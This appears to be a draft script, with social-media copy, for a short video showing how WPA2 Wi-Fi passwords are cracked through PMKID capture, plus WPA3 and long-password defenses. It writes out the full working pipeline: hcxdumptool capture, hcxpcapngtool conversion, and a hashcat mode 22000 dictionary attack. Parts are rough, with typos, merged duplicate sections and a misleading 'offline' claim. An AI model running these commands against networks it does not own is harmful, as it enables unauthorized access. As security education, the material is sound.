## Short: "WiFi Cracks Start Before You Type a Password"

---

## Headline
WiFi Falls After PMKID

## Text
How WPA2 - WLANs are cracked and why you need a decent password !

How would an attacker crack your Wi-Fi network ?
The appraoch your network and provoke a WPA2 PMKID/Handshake. (airodump, airpplay...etc.)
A
Cracking WiFi doesn't start with hashcat. It starts with one packet. Once the attacker has it, you're already offline.

WPA2 has a four-way handshake. There's also a single-frame variant called PMKID, sent by the access point itself. Either one is enough.

Step one: capture. hcxdumptool puts a wireless card into monitor mode and grabs PMKIDs as they fly past — in a lab, against your own access point. You only need one.

Step two: convert the pcapng to hashcat's modern WPA format with hcxpcapngtool. The output is a .hc22000 file.

Step three: throw rockyou.txt at it in mode 22000 — the unified PBKDF2 mode that replaced the old 16800 and 2500. If the password's in the list, every device on that network is now your device.

There are list with millions of exposed passwords available free on the web.
So if you use funny passwords like "xnxn" or "jjjkk" your Wi-Fi-network wont last a minute.

How to defense ?
- First: Change to WPA3 . It does not expsoe the MIC. This prevent offline cracking.
- Second: Password Complexity is a real thing, you know.


Defense: long pre-shared key, or move to WPA3 — it uses a handshake design that defeats offline dictionary attacks entirely. Next short: ZIP and PDF passwords. See you.

---

## Display / CLI / Code

```bash
# Clean potfile
rm -f ~/.local/share/hashcat/hashcat.potfile

# Step 1 — capture PMKID (lab AP only; needs root + monitor-mode-capable card)
# --filterlist_ap scopes capture to a single controlled BSSID
sudo hcxdumptool -i wlan0mon -o capture.pcapng \
     --enable_status=1 --filterlist_ap=mybssid.txt --filtermode=2

# Step 2 — convert pcapng to hashcat 22000 format
hcxpcapngtool -o wifi.hc22000 capture.pcapng

# Step 3 — crack with mode 22000 (WPA-PBKDF2-PMKID+EAPOL)
hashcat -m 22000 -a 0 wifi.hc22000 /usr/share/wordlists/rockyou.txt

# Reveal the cracked PSK
hashcat -m 22000 wifi.hc22000 --show
```

Show: `hcxdumptool` printing PMKID lines → `hcxpcapngtool` outputting the .hc22000 file → `hashcat` status cracking → `--show` printing the network password. Pause on the PSK.

---

## Youtube title
1. WiFi Cracking Doesn't Start With Hashcat — It Starts With One Packet
2. One PMKID Frame Is All It Takes to Take Your WiFi Offline
3. hcxdumptool + hcxpcapngtool + hashcat -m 22000: The Full WPA2 Pipeline
4. Is WPA2 Still Safe If You Pick an 8-Character Password?

## Youtube Description
WPA2 cracking happens entirely offline — the only online step is grabbing a single PMKID frame from an access point. This short walks the full pipeline: capture with `hcxdumptool`, convert to hashcat 22000 format with `hcxpcapngtool`, then dictionary-attack with `hashcat -m 22000` and rockyou.txt. Lab demo against an access point we control.

Commands shown:
- `sudo hcxdumptool -i wlan0mon -o capture.pcapng --filterlist_ap=mybssid.txt --filtermode=2`
- `hcxpcapngtool -o wifi.hc22000 capture.pcapng`
- `hashcat -m 22000 -a 0 wifi.hc22000 /usr/share/wordlists/rockyou.txt`
- `hashcat -m 22000 wifi.hc22000 --show`

#infosec #wifi #wpa2 #hashcat #cybersecurity

## LinkedIn Description
Assume any WPA2 access point in range can have its PMKID captured in seconds — the entire crack then happens offline against any wordlist the attacker has. Move enterprise networks to WPA3-Enterprise or 802.1X with EAP-TLS, and audit guest PSK length: anything under 16 random characters is crackable over a coffee break.

#blueteam #wifi #wpa3 #cybersecurity
